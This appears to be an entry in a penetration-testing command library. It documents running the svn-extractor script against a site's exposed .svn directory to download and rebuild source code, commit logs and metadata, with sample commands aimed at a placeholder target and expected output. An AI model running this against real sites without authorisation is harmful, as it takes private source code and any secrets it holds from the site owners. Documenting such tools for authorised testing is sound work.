---
id: a5311a06-f7e6-4e3b-a879-6cc1790ec755
name: run-svn-extractor-on-url
type: command
executor: bash
data: 'python svn-extractor.py --url "http://target.com/repo/.svn/"'
output: null
created_at: '2023-04-06T03:56:00.290322+00:00'
updated_at: '2023-04-10T20:33:57.619782+00:00'
platforms:
  - Linux
tags:
  - python
  - svn
  - extraction
verified: true
validated: true
---

# run-svn-extractor-on-url

## Command

```bash
python svn-extractor.py --url "$_TARGET_URL"
```

## Description

This command executes the svn-extractor Python script to download and reconstruct files from an exposed .svn directory in a Subversion repository, extracting source code and metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --url | The full URL to the .svn directory (e.g., http://target.com/repo/.svn/) | Yes |
| $_TARGET_URL | Placeholder for the target SVN URL | Yes |

## Examples

### Basic Usage

```bash
python svn-extractor.py --url "http://target.com/repo/.svn/"
```

### Advanced Usage

Run from the cloned directory with verbose output if supported:

```bash
cd svn-extractor && python svn-extractor.py --url "http://target.com/repo/.svn/"
```

## Expected Output

Starting extraction from http://target.com/repo/.svn/
Downloading entries file...
[Progress] Fetching text-base files...
Extraction complete. Output saved to ./extracted_repo/

Files like source code, commit logs, and props are saved in a local mirrored structure.

## Related

- [[procedures/Extract-Source-Code-from-Insecure-Subversion-Repository]]
- [[tools/svn-extractor]]
